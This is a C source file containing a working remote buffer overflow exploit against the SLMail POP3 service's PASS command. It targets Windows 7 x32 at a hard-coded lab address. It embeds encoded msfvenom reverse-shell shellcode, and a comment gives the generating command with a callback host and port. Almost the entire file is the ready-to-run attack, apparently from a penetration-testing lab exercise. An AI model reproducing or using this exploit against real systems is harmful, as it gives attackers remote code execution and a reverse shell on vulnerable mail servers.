#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#include <arpa/inet.h>  // Fix for declarations: inet_addr
#include <unistd.h>     // Fix for declarations: inet_addr
 
#define retadd "\x8f\x35\x4a\x5f" //Windows 7 x32 0x5f4a358f
#define port 110

// reverse shell
// msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

unsigned char shellcode[] =
"\xda\xde\xbe\xb6\x4c\x90\x95\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x83\xc5\x04\x31\x75\x13\x03\xc3\x5f\x72\x60\xd7\x88\xf0"
"\x8b\x27\x49\x95\x02\xc2\x78\x95\x71\x87\x2b\x25\xf1\xc5\xc7"
"\xce\x57\xfd\x5c\xa2\x7f\xf2\xd5\x09\xa6\x3d\xe5\x22\x9a\x5c"
"\x65\x39\xcf\xbe\x54\xf2\x02\xbf\x91\xef\xef\xed\x4a\x7b\x5d"
"\x01\xfe\x31\x5e\xaa\x4c\xd7\xe6\x4f\x04\xd6\xc7\xde\x1e\x81"
"\xc7\xe1\xf3\xb9\x41\xf9\x10\x87\x18\x72\xe2\x73\x9b\x52\x3a"
"\x7b\x30\x9b\xf2\x8e\x48\xdc\x35\x71\x3f\x14\x46\x0c\x38\xe3"
"\x34\xca\xcd\xf7\x9f\x99\x76\xd3\x1e\x4d\xe0\x90\x2d\x3a\x66"
"\xfe\x31\xbd\xab\x75\x4d\x36\x4a\x59\xc7\x0c\x69\x7d\x83\xd7"
"\x10\x24\x69\xb9\x2d\x36\xd2\x66\x88\x3d\xff\x73\xa1\x1c\x68"
"\xb7\x88\x9e\x68\xdf\x9b\xed\x5a\x40\x30\x79\xd7\x09\x9e\x7e"
"\x18\x20\x66\x10\xe7\xcb\x97\x39\x2c\x9f\xc7\x51\x85\xa0\x83"
"\xa1\x2a\x75\x03\xf1\x84\x26\xe4\xa1\x64\x97\x8c\xab\x6a\xc8"
"\xad\xd4\xa0\x61\x47\x2f\x23\x4e\x30\x29\x35\x26\x43\x35\x28"
"\xeb\xca\xd3\x20\x03\x9b\x4c\xdd\xba\x86\x06\x7c\x42\x1d\x63"
"\xbe\xc8\x92\x94\x71\x39\xde\x86\xe6\xc9\x95\xf4\xa1\xd6\x03"
"\x90\x2e\x44\xc8\x60\x38\x75\x47\x37\x6d\x4b\x9e\xdd\x83\xf2"
"\x08\xc3\x59\x62\x72\x47\x86\x57\x7d\x46\x4b\xe3\x59\x58\x95"
"\xec\xe5\x0c\x49\xbb\xb3\xfa\x2f\x15\x72\x54\xe6\xca\xdc\x30"
"\x7f\x21\xdf\x46\x80\x6c\xa9\xa6\x31\xd9\xec\xd9\xfe\x8d\xf8"
"\xa2\xe2\x2d\x06\x79\xa7\x4e\xe5\xab\xd2\xe6\xb0\x3e\x5f\x6b"
"\x43\x95\x9c\x92\xc0\x1f\x5d\x61\xd8\x6a\x58\x2d\x5e\x87\x10"
"\x3e\x0b\xa7\x87\x3f\x1e";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 12);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.10.10.11");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
